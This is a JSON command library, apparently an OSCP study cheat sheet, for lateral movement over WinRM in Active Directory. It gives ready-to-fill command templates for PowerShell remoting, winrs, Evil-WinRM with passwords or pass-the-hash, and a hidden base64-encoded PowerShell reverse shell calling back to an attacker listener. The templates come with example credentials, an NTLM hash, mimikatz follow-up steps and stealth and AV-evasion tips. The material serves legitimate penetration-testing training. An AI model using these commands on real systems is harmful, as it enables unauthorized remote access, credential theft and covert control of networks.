{
  "commands": [
    {
      "id": "winrm-enter-pssession",
      "name": "WinRM - Enter-PSSession Interactive",
      "description": "Establish interactive PowerShell remoting session using Enter-PSSession (native Windows PowerShell)",
      "command": "$password = ConvertTo-SecureString '<PASS>' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('<USER>', $password); Enter-PSSession -ComputerName <TARGET> -Credential $credential",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP or hostname",
          "example": "192.168.50.73",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Domain\\username with Remote Management Users or Administrators group membership",
          "example": "corp\\jen",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "User password",
          "example": "Nexus123!",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "winrm",
        "powershell",
        "lateral-movement",
        "active-directory",
        "windows",
        "interactive",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [
        "winrm-new-pssession",
        "winrm-invoke-command",
        "evil-winrm-creds"
      ],
      "next_steps": [
        "mimikatz-sekurlsa-logonpasswords  # Dump cached credentials from interactive session",
        "ad-user-enumeration  # Enumerate domain accounts and groups"
      ],
      "flag_explanations": {
        "ConvertTo-SecureString": "Converts plain text password to encrypted SecureString object",
        "-AsPlainText": "Accepts plain text password input",
        "-Force": "Suppresses confirmation prompts",
        "New-Object PSCredential": "Creates credential object for authentication",
        "Enter-PSSession": "Establishes interactive remote PowerShell session",
        "-ComputerName": "Target system hostname or IP address",
        "-Credential": "PSCredential object containing username and password"
      },
      "success_indicators": [
        "[<TARGET>]: PS C:\\Users\\",
        "Prompt shows remote computer name in brackets",
        "Commands execute on remote system"
      ],
      "failure_indicators": [
        "WinRM cannot complete the operation",
        "Access is denied",
        "The user name or password is incorrect",
        "The WinRM client cannot process the request"
      ],
      "troubleshooting": {
        "Access is denied": "User must be in Remote Management Users or Administrators group. Verify: net user <USER> /domain",
        "WinRM cannot complete": "Check WinRM enabled: Test-WSMan -ComputerName <TARGET>",
        "Connection timeout": "Firewall blocking port 5985/5986: Test-NetConnection <TARGET> -Port 5985",
        "SSL certificate error": "Use -UseSSL flag for port 5986 or -SessionOption (New-PSSessionOption -SkipCACheck -SkipCNCheck)"
      },
      "notes": "OSCP TRAINING MATERIAL - POWERSHELL REMOTING (ENTER-PSSESSION):\n\nTRAINING WORKFLOW: From OSCP module, PowerShell remoting demonstrated with session creation:\n1. Create PSCredential object (ConvertTo-SecureString + New-Object PSCredential)\n2. New-PSSession -ComputerName 192.168.50.73 -Credential $credential (creates session)\n3. Enter-PSSession 1 (connects to session ID 1 interactively)\n4. Commands execute remotely, verified with whoami/hostname showing FILES04\n\nWHAT IS POWERSHELL REMOTING: Microsoft's official remote administration protocol called \"PowerShell remoting\" - built-in WinRM capability accessed through PowerShell cmdlets. Invoked via Enter-PSSession for interactive access.\n\nPROTOCOL: WinRM over WS-Management:\n- Port 5985: HTTP (plain HTTP traffic)\n- Port 5986: HTTPS (encrypted SSL/TLS traffic)\n- Based on WS-Management open standard\n\nGROUP MEMBERSHIP REQUIREMENT (CRITICAL): User must be member of:\n- Administrators group (default), OR\n- Remote Management Users group\non the target machine.\n\nPSCREDENTIAL OBJECT CREATION (REQUIRED):\nTraining shows three-step process:\n```\n$username = 'jen'\n$password = 'Nexus123!'\n$secureString = ConvertTo-SecureString $password -AsPlaintext -Force\n$credential = New-Object System.Management.Automation.PSCredential $username, $secureString\n```\nThis pattern is reusable across WMI, WinRM, and other PowerShell remote operations.\n\nINTERACTIVE SESSION BEHAVIOR:\n- Prompt changes to [TARGET]: PS C:\\Users\\username>\n- All commands execute in remote PowerShell context\n- Current directory, environment variables are REMOTE system's\n- Exit-PSSession returns to local prompt\n- Session persists after disconnection (can reconnect with Enter-PSSession)\n\nCOMPARISON - ENTER-PSSESSION VS NEW-PSSESSION:\n- Enter-PSSession: Interactive (like SSH), single target, manual command entry\n- New-PSSession: Creates session object for programmatic use with Invoke-Command\n- Both use WinRM, same port requirements, same authentication\n\nLOGGING & DETECTION:\n- Event ID 4624: Logon event (Type 3: Network logon)\n- Event ID 4688: Process creation (PowerShell.exe)\n- WinRM event logs: Microsoft-Windows-WinRM/Operational\n- PowerShell script block logging (if enabled)\n- MORE VISIBLE than WMI/DCOM - creates legitimate admin session logs\n\nWHOAMI BEHAVIOR: Training notes whoami shows remote user identity correctly (corp\\jen on FILES04), confirming remote execution context.\n\nTIME ESTIMATE: 2-3 minutes (PSCredential creation + session establishment + verification).\n\nEXAM STRATEGY: Most stable and feature-rich Windowsâ†’Windows lateral movement. Use when you control Windows attack box and want interactive access. For automation, use Invoke-Command or New-PSSession.",
      "oscp_relevance": "high"
    },
    {
      "id": "winrm-new-pssession",
      "name": "WinRM - New-PSSession Reusable Session",
      "description": "Create persistent reusable PowerShell remoting session with New-PSSession for multiple command execution",
      "command": "$password = ConvertTo-SecureString '<PASS>' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('<USER>', $password); $session = New-PSSession -ComputerName <TARGET> -Credential $credential; Invoke-Command -Session $session -ScriptBlock {<COMMAND>}",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP or hostname",
          "example": "192.168.50.73",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Domain\\username",
          "example": "corp\\jen",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password",
          "example": "Nexus123!",
          "required": true
        },
        {
          "name": "<COMMAND>",
          "description": "PowerShell command to execute in session",
          "example": "whoami; hostname",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "winrm",
        "powershell",
        "lateral-movement",
        "active-directory",
        "windows",
        "session-management",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [
        "winrm-enter-pssession",
        "winrm-invoke-command"
      ],
      "next_steps": [
        "winrm-invoke-command  # Execute commands using session: Invoke-Command -Session $session -ScriptBlock {command}"
      ],
      "flag_explanations": {
        "New-PSSession": "Creates persistent PowerShell session object (reusable)",
        "-Session": "References existing session object for command execution",
        "-ScriptBlock": "PowerShell code block to execute remotely",
        "Invoke-Command": "Executes commands in remote session",
        "$session": "Variable storing session object for reuse"
      },
      "success_indicators": [
        "Session object created",
        "$session variable contains PSSession",
        "Get-PSSession shows active session",
        "Commands execute successfully"
      ],
      "failure_indicators": [
        "New-PSSession : Access is denied",
        "The WinRM client cannot process the request",
        "Cannot validate argument on parameter 'Session'"
      ],
      "troubleshooting": {
        "Access denied": "Verify credentials: Test-WSMan -ComputerName <TARGET> -Credential $credential",
        "Session creation fails": "Check WinRM service: Get-Service WinRM -ComputerName <TARGET>",
        "Session disconnected": "Network interruption. Reconnect: Connect-PSSession -Session $session",
        "Session not found": "Session may have timed out (default 4 hours). Create new session"
      },
      "notes": "EDUCATIONAL CONTEXT: New-PSSession creates persistent session object for efficient multi-command execution. WHY PERSISTENT: Avoids re-authentication overhead for each command - session remains open until explicitly removed. ADVANTAGES OVER ENTER-PSSESSION: Non-blocking (can run commands in background), supports parallel execution on multiple targets. USE CASE: Batch automation - execute multiple scripts without reconnecting. PERFORMANCE: First command slower (session creation), subsequent commands faster (reuse). SESSION MANAGEMENT: View sessions with Get-PSSession, remove with Remove-PSSession $session. TIMEOUT: Default idle timeout 4 hours (configurable with -SessionOption). PARALLEL EXECUTION: Create array of sessions, use Invoke-Command -Session $sessions -Parallel. TIME ESTIMATE: 2-3 minutes for setup, <1 minute per subsequent command. EXAM TIP: Use for scripted enumeration across multiple targets.",
      "oscp_relevance": "high"
    },
    {
      "id": "winrm-invoke-command",
      "name": "WinRM - Invoke-Command One-Shot Execution",
      "description": "Execute single PowerShell command remotely without persistent session using Invoke-Command",
      "command": "$password = ConvertTo-SecureString '<PASS>' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('<USER>', $password); Invoke-Command -ComputerName <TARGET> -Credential $credential -ScriptBlock {<COMMAND>}",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP or hostname",
          "example": "192.168.50.73",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Domain\\username",
          "example": "corp\\jen",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password",
          "example": "Nexus123!",
          "required": true
        },
        {
          "name": "<COMMAND>",
          "description": "PowerShell command or script block to execute",
          "example": "Get-Process",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "winrm",
        "powershell",
        "lateral-movement",
        "active-directory",
        "windows",
        "one-shot",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [
        "winrm-new-pssession",
        "evil-winrm-creds",
        "wmi-invoke-method"
      ],
      "next_steps": [
        "winrm-new-pssession  # Upgrade to persistent session for multiple commands"
      ],
      "flag_explanations": {
        "Invoke-Command": "Executes commands on remote computers",
        "-ComputerName": "Target system (can be array for multiple targets)",
        "-ScriptBlock": "PowerShell code to execute remotely",
        "-FilePath": "Alternative to -ScriptBlock - execute local script remotely",
        "-ArgumentList": "Pass parameters to script block"
      },
      "success_indicators": [
        "Command output returned to local console",
        "PSComputerName property shows remote hostname",
        "No error messages"
      ],
      "failure_indicators": [
        "Invoke-Command : Access is denied",
        "The WinRM client cannot process the request",
        "The user name or password is incorrect"
      ],
      "troubleshooting": {
        "Access denied": "User not in Remote Management Users group. Verify: net localgroup 'Remote Management Users' /domain",
        "WinRM client error": "Enable WinRM on target: Enable-PSRemoting -Force",
        "Script block too long": "Use -FilePath instead: Invoke-Command -FilePath .\\script.ps1 -ComputerName <TARGET>",
        "No output returned": "Command may still execute - verify on target system"
      },
      "notes": "EDUCATIONAL CONTEXT: Invoke-Command is PowerShell's most versatile remote execution method - supports one-shot and persistent sessions. WHY ONE-SHOT: Quick command execution without session management overhead. WHEN TO USE: Single command, quick enumeration, testing. COMPARISON: Faster for single command than Enter-PSSession (no interactive overhead), slower for multiple commands than New-PSSession (no session reuse). MULTIPLE TARGETS: Supports -ComputerName @('target1','target2','target3') for parallel execution. SCRIPT EXECUTION: Use -FilePath to execute local script on remote system. OUTPUT HANDLING: Results include PSComputerName property for multi-target tracking. ALTERNATIVE SYNTAX: Invoke-Command -ComputerName <TARGET> {<COMMAND>} -Credential $credential (shorter). TIME ESTIMATE: 1-2 minutes per command. EXAM TIP: Best for quick enumeration, use New-PSSession for sustained access.",
      "oscp_relevance": "high"
    },
    {
      "id": "winrm-winrs",
      "name": "WinRM - Legacy winrs.exe Command",
      "description": "Execute commands remotely using legacy winrs.exe utility (Windows Remote Shell)",
      "command": "winrs -r:<TARGET> -u:<USER> -p:<PASS> <COMMAND>",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target hostname or IP",
          "example": "192.168.50.73",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Domain\\username",
          "example": "corp\\jen",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password",
          "example": "Nexus123!",
          "required": true
        },
        {
          "name": "<COMMAND>",
          "description": "cmd.exe command to execute (not PowerShell)",
          "example": "whoami",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "winrm",
        "winrs",
        "lateral-movement",
        "active-directory",
        "windows",
        "legacy",
        "oscp:medium"
      ],
      "prerequisites": [],
      "alternatives": [
        "winrm-invoke-command",
        "evil-winrm-creds"
      ],
      "next_steps": [
        "winrm-invoke-command  # Upgrade to PowerShell remoting for better functionality"
      ],
      "flag_explanations": {
        "-r:<TARGET>": "Remote computer name or IP",
        "-u:<USER>": "Username in DOMAIN\\user format",
        "-p:<PASS>": "Password for authentication",
        "-noprofile": "Don't load user profile (faster)",
        "-environment": "Set environment variables"
      },
      "success_indicators": [
        "Command output displayed",
        "No error messages",
        "Exit code 0"
      ],
      "failure_indicators": [
        "Winrs error: Access is denied",
        "WinRM service is not available",
        "The specified credentials were rejected by the server"
      ],
      "troubleshooting": {
        "Access denied": "User needs Remote Management Users membership: net localgroup 'Remote Management Users' <USER> /add",
        "WinRM not available": "Enable on target: winrm quickconfig -q",
        "Credentials rejected": "Verify password: crackmapexec winrm <TARGET> -u <USER> -p <PASS>",
        "Command not found": "winrs executes cmd.exe commands only, not PowerShell"
      },
      "notes": "OSCP TRAINING MATERIAL - WINRS (WINDOWS REMOTE SHELL):\n\nTRAINING EXAMPLE: From OSCP module, jen's credentials used to execute commands remotely on FILES04:\n'winrs -r:files04 -u:jen -p:Nexus123! \"cmd /c hostname & whoami\"'\nOutput confirmed remote execution: 'FILES04' and 'corp\\jen'\n\nWHAT IS WINRS: Windows Remote Shell - command-line WinRM client pre-dating PowerShell remoting. Built into all modern Windows systems. Alternative to PsExec/WMI when PowerShell unavailable.\n\nPROTOCOL: WinRM over WS-Management:\n- Port 5986: Encrypted HTTPS traffic\n- Port 5985: Plain HTTP\n- Microsoft's implementation of WS-Management protocol\n\nGROUP MEMBERSHIP REQUIREMENT (CRITICAL): For winRS to work, domain user must be part of:\n- Administrators group (local admin rights), OR\n- Remote Management Users group on target host\n\nThis is explicitly stated in training: \"For WinRS to work, the domain user needs to be part of the Administrators or Remote Management Users group on the target host.\"\n\nREVERSE SHELL DEPLOYMENT: Training shows replacing commands with base64-encoded PowerShell reverse shell:\n'winrs -r:files04 -u:jen -p:Nexus123! \"powershell -nop -w hidden -e JABjAGwAaQBlAG4A...\"'\n\nThis spawned reverse shell to Netcat listener on Kali (port 443), achieving lateral movement.\n\nLIMITATIONS VS POWERSHELL REMOTING:\n- cmd.exe commands only (unless invoking powershell.exe)\n- No interactive persistent session\n- No tab completion or command history\n- Less sophisticated than Enter-PSSession\n\nCOMMAND EXECUTION SYNTAX:\n- Use \"cmd /c\" prefix for multiple commands: winrs -r:files04 \"cmd /c hostname & whoami\"\n- Quote entire command string\n- Commands execute in cmd.exe context, NOT PowerShell\n\nWHEN TO USE IN OSCP:\n- PowerShell remoting blocked/restricted\n- Quick one-off command execution\n- Older Windows systems (pre-PowerShell 2.0)\n- Compatibility with cmd.exe-based tools\n\nTIME ESTIMATE: <1 minute per command execution.\n\nEXAM STRATEGY: Prefer PowerShell remoting (Enter-PSSession/Invoke-Command) for better functionality. Use winrs as fallback when PowerShell restricted.",
      "oscp_relevance": "medium"
    },
    {
      "id": "evil-winrm-creds",
      "name": "Evil-WinRM - Password Authentication",
      "description": "Establish interactive PowerShell remoting from Kali using Evil-WinRM with password authentication",
      "command": "evil-winrm -i <TARGET> -u <USER> -p '<PASS>'",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP address",
          "example": "192.168.50.73",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Username (with or without domain)",
          "example": "jen",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password",
          "example": "Nexus123!",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "winrm",
        "evil-winrm",
        "lateral-movement",
        "active-directory",
        "kali",
        "interactive",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [
        "evil-winrm-hash",
        "winrm-enter-pssession",
        "psexec-impacket-shell"
      ],
      "next_steps": [
        "mimikatz-sekurlsa-logonpasswords  # Dump credentials from LSASS",
        "ad-user-enumeration  # Enumerate domain users and groups"
      ],
      "flag_explanations": {
        "-i": "Target IP address",
        "-u": "Username for authentication",
        "-p": "Password (use single quotes to escape special characters)",
        "-H": "Use NTLM hash instead of password (see evil-winrm-hash)",
        "-S": "Use SSL (HTTPS on port 5986)",
        "-P": "Specify custom port (default 5985 HTTP, 5986 HTTPS)",
        "-s": "Path to PowerShell scripts directory (auto-loaded)",
        "-e": "Path to executables directory (auto-loaded)"
      },
      "success_indicators": [
        "Evil-WinRM shell v3",
        "*Evil-WinRM* PS C:\\Users\\",
        "Interactive PowerShell prompt obtained"
      ],
      "failure_indicators": [
        "Error: An error of type WinRM::WinRMAuthorizationError",
        "Error: An error of type Errno::ETIMEDOUT",
        "Error: SSL certificate verify failed"
      ],
      "troubleshooting": {
        "Authorization error": "User not in Remote Management Users group. Verify with: crackmapexec winrm <TARGET> -u <USER> -p <PASS>",
        "Connection timeout": "Port 5985/5986 blocked. Check: sudo nmap -p 5985,5986 -Pn -v <TARGET>",
        "SSL certificate failed": "Use -S flag for HTTPS with self-signed cert, or omit -S for HTTP",
        "Password with special chars": "Wrap password in single quotes: -p 'Pass@123!'",
        "Domain authentication": "Specify domain: -u 'DOMAIN\\user' or -u user@domain.com"
      },
      "notes": "EDUCATIONAL CONTEXT: Evil-WinRM is Ruby-based WinRM client for Kali - preferred tool for Windows lateral movement from Linux. WHY EVIL-WINRM: Built-in file upload/download, PowerShell script loading, executable management, tab completion, command history. ADVANTAGES: Native feel (PowerShell prompt), upload/download commands, menu system (help menu). FILE OPERATIONS: upload /kali/path C:\\Windows\\Temp\\file.exe, download C:\\Users\\user\\file.txt /kali/path. SCRIPT LOADING: Use -s /path/to/scripts to auto-load PowerShell scripts (accessible with script_name). EXECUTABLE MENU: Use -e /path/to/exes for pre-loaded binaries (run with Invoke-Binary). STEALTH: Creates standard WinRM logs (Event ID 4624, 4688) - same as legitimate admin access. COMPARISON: More features than Invoke-Command, easier than PSExec from Kali. TIME ESTIMATE: 1-2 minutes for connection. EXAM TIP: First choice for Kali \u2192 Windows lateral movement, most stable and feature-rich. COMMON LOCATIONS: Default Kali install, or gem install evil-winrm.",
      "oscp_relevance": "high"
    },
    {
      "id": "evil-winrm-hash",
      "name": "Evil-WinRM - Pass-the-Hash",
      "description": "Authenticate to WinRM using NTLM hash instead of password (pass-the-hash attack)",
      "command": "evil-winrm -i <TARGET> -u <USER> -H <NTLM_HASH>",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP address",
          "example": "192.168.50.73",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Username (without password)",
          "example": "administrator",
          "required": true
        },
        {
          "name": "<NTLM_HASH>",
          "description": "NTLM hash (32-character hex string)",
          "example": "64f12cddaa88057e06a81b54e73b949b",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "winrm",
        "evil-winrm",
        "lateral-movement",
        "active-directory",
        "kali",
        "pass-the-hash",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [
        "evil-winrm-creds",
        "psexec-impacket-shell"
      ],
      "next_steps": [
        "mimikatz-sekurlsa-logonpasswords  # Dump credentials from LSASS",
        "ad-user-enumeration  # Enumerate domain users and groups",
        "evil-winrm-hash  # Reuse hash for lateral movement to other targets"
      ],
      "flag_explanations": {
        "-H": "NTLM hash for pass-the-hash authentication",
        "-i": "Target IP address",
        "-u": "Username (hash used instead of password)",
        "Full hash format": "LM:NTLM (use :NTLM_HASH if no LM hash available)"
      },
      "success_indicators": [
        "Evil-WinRM shell v3",
        "*Evil-WinRM* PS C:\\Users\\",
        "Authentication successful without password"
      ],
      "failure_indicators": [
        "Error: An error of type WinRM::WinRMAuthorizationError",
        "Error: Invalid hash format",
        "Error: An error of type Errno::ECONNREFUSED"
      ],
      "troubleshooting": {
        "Invalid hash format": "Use 32-character hex NTLM hash only (no LM hash needed)",
        "Authorization error": "Hash may be invalid or user lacks WinRM access. Verify hash with: crackmapexec smb <TARGET> -u <USER> -H <HASH>",
        "Connection refused": "Port 5985 closed. Check: sudo nmap -p 5985 -Pn -v <TARGET>",
        "Hash accepted but access denied": "User account may be disabled or WinRM restricted"
      },
      "notes": "EDUCATIONAL CONTEXT: Pass-the-hash allows authentication with NTLM hash without knowing plaintext password - critical for lateral movement. WHY THIS WORKS: Windows NTLM authentication accepts hash directly - password never needed if you have hash. HASH EXTRACTION: Obtain hashes with secretsdump.py, mimikatz (lsadump::sam), or crackmapexec --sam. HASH FORMAT: Only need NTLM portion (32 hex chars), LM hash optional. If both: use -H LM:NTLM, if NTLM only: use -H :NTLM_HASH or just -H NTLM_HASH. STEALTH: Creates same logs as password authentication - hash usage not visible in logs. PERSISTENCE: Hash remains valid until password changed - can reuse for multiple sessions. LATERAL MOVEMENT: Same hash works across all machines where account is local admin (local accounts) or domain member (domain accounts). TIME ESTIMATE: 1-2 minutes (same as password auth). EXAM TIP: Critical technique after dumping SAM/NTDS - enables lateral movement without password cracking.",
      "oscp_relevance": "high"
    },
    {
      "id": "test-wsman",
      "name": "WinRM - Test-WSMan Verification",
      "description": "Verify WinRM service is accessible and responding on target before attempting authentication",
      "command": "Test-WSMan -ComputerName <TARGET>",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP or hostname",
          "example": "192.168.50.73",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "winrm",
        "verification",
        "enumeration",
        "active-directory",
        "windows",
        "oscp:medium"
      ],
      "prerequisites": [],
      "alternatives": [],
      "next_steps": [
        "evil-winrm-creds  # If successful, proceed with authentication",
        "winrm-enter-pssession  # Alternative PowerShell remoting method"
      ],
      "flag_explanations": {
        "Test-WSMan": "Tests WinRM connectivity and returns service info",
        "-ComputerName": "Target system to test",
        "-Credential": "Optional - test with specific credentials",
        "-UseSSL": "Test HTTPS (port 5986) instead of HTTP (port 5985)",
        "-Port": "Specify non-standard port (default 5985)"
      },
      "success_indicators": [
        "wsmid : http://schemas.dmtf.org/wbem/wsman/identity/1/wsmanidentity.xsd",
        "ProtocolVersion : http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd",
        "ProductVendor : Microsoft Corporation",
        "ProductVersion : OS:"
      ],
      "failure_indicators": [
        "Test-WSMan : The WinRM client cannot complete the operation",
        "The client cannot connect to the destination specified in the request",
        "WinRM cannot process the request"
      ],
      "troubleshooting": {
        "Cannot connect": "Port 5985 blocked by firewall: sudo nmap -p 5985,5986 -Pn -v <TARGET>",
        "Request timeout": "Target unreachable or WinRM disabled: Test-NetConnection <TARGET> -Port 5985",
        "SSL/TLS error": "Use -UseSSL for HTTPS (port 5986) or omit for HTTP (port 5985)",
        "Access denied": "This test doesn't require credentials - if denied, WinRM may be restricted to specific IPs"
      },
      "notes": "EDUCATIONAL CONTEXT: Test-WSMan performs unauthenticated connectivity test to WinRM service - quick way to verify WinRM availability before attempting authentication. WHY TEST FIRST: Avoids failed authentication attempts, validates port accessibility, identifies protocol version. WHAT IT CHECKS: WinRM service responding, protocol version supported, product version (Windows OS). NO CREDENTIALS: Basic test requires no authentication - checks if service is listening. PORTS: Default HTTP on 5985, HTTPS on 5986 (use -UseSSL). VERBOSE OUTPUT: Returns XML identifying service details (wsmid, ProtocolVersion, ProductVendor). ALTERNATIVE TEST: From Kali use nmap -p 5985,5986 or crackmapexec winrm <TARGET> (shows WINRM in banner). TIME ESTIMATE: <30 seconds. EXAM TIP: Quick check before attempting lateral movement - confirms WinRM available.",
      "oscp_relevance": "medium"
    },
    {
      "id": "winrm-revshell-invoke",
      "name": "WinRM - PowerShell Reverse Shell via Invoke-Command",
      "description": "Deploy base64-encoded PowerShell reverse shell through WinRM for callback to attacker",
      "command": "$password = ConvertTo-SecureString '<PASS>' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('<USER>', $password); Invoke-Command -ComputerName <TARGET> -Credential $credential -ScriptBlock {powershell -nop -w hidden -e <BASE64_PAYLOAD>}",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP",
          "example": "192.168.50.73",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Domain\\username",
          "example": "corp\\jen",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password",
          "example": "Nexus123!",
          "required": true
        },
        {
          "name": "<BASE64_PAYLOAD>",
          "description": "Base64-encoded PowerShell reverse shell (use base64-encode-powershell)",
          "example": "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AC...",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "winrm",
        "powershell",
        "reverse-shell",
        "lateral-movement",
        "active-directory",
        "windows",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [
        "wmi-powershell-revshell"
      ],
      "next_steps": [
        "mimikatz-sekurlsa-logonpasswords  # Dump credentials after shell established",
        "ad-user-enumeration  # Enumerate domain accounts"
      ],
      "flag_explanations": {
        "-nop": "No profile - don't load PowerShell profiles (faster execution, stealthy)",
        "-w hidden": "Hidden window - no visible PowerShell window spawned",
        "-e <BASE64>": "Encoded command - executes base64-encoded payload",
        "-ScriptBlock": "PowerShell code block executed remotely via WinRM"
      },
      "success_indicators": [
        "Netcat listener receives connection",
        "PowerShell prompt from target",
        "whoami shows target user context"
      ],
      "failure_indicators": [
        "Invoke-Command : Access is denied",
        "No connection received on listener",
        "The term 'powershell' is not recognized",
        "Base64 decoding error"
      ],
      "troubleshooting": {
        "No connection received": "Verify LHOST/LPORT in encoded payload match listener: [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<BASE64>'))",
        "Access denied": "User lacks Remote Management Users membership: net localgroup 'Remote Management Users' <USER> /add",
        "Payload execution error": "Test decoding: [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<BASE64>'))",
        "Firewall blocking callback": "Test outbound connectivity first: Test-NetConnection <LHOST> -Port <LPORT>",
        "PowerShell not found": "Use full path: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
      },
      "notes": "EDUCATIONAL CONTEXT: Combines WinRM lateral movement with PowerShell reverse shell for full interactive callback. WHY BASE64: Avoids escaping issues with special characters in PowerShell one-liner, bypasses some basic AV signature detection. HOW TO GENERATE PAYLOAD: Use base64-encode-powershell command or: $bytes = [System.Text.Encoding]::Unicode.GetBytes($payload); $encoded = [Convert]::ToBase64String($bytes). WHAT HAPPENS: Invoke-Command executes 'powershell -e' on target \u2192 target decodes base64 \u2192 executes reverse shell \u2192 connects back to LHOST:LPORT. STEALTH CONSIDERATIONS: -w hidden prevents visible window, -nop avoids profile scripts, base64 bypasses simple string detection. LOGGING: Creates WinRM event logs (Event ID 4624, 4688) and PowerShell script block logging if enabled. MANUAL DECODE TEST: [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<BASE64>')) to verify payload. ALTERNATIVES: Use Evil-WinRM to upload nc.exe or other reverse shell binary. TIME ESTIMATE: 3-5 minutes including payload generation and listener setup. EXAM TIP: Pre-generate base64 payloads before exam for common LHOST/LPORT combinations.",
      "oscp_relevance": "high"
    }
  ]
}